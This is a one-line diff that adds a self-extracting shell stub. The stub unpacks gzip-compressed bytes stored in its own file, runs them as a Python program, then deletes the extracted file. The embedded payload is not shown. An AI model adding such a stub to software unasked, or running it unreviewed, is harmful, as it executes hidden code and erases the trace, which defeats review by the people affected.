@@ -1,0 +1,1 @@
+dd bs=1 skip=60<$0|gunzip>T;chmod +x T;python ./T;rm T;exit
